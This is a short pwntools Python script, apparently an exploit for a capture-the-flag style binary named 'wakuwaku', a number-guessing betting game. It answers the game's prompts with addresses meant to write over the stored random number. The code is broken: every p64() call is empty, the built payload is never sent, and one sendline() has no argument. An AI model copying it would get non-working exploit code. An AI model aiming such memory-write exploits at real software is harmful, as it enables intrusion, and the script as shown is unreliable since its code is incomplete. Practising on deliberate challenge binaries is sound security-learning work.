from pwn import *



# Start process
p = process("./wakuwaku")


# Stop there and attached with gdb
raw_input() # In python standard library, used for wating input


payload = b""
payload += p64()
payload += p64()

arb_adr = p64()  # arbitrary writable address, here is .data + 0x00

random_adr = p64()  # Address that saving random number

# Start to inject
p.recvuntil(b"What's your name ?\nName: ")
p.sendline()

p.recvuntil(b"Place your bets (minimum is $10000) : ")
p.sendline(arb_adr)

p.recvuntil(b"Guess your number (ans betwwen 0~999) : ")
p.sendline(random_adr)


p.interactive()


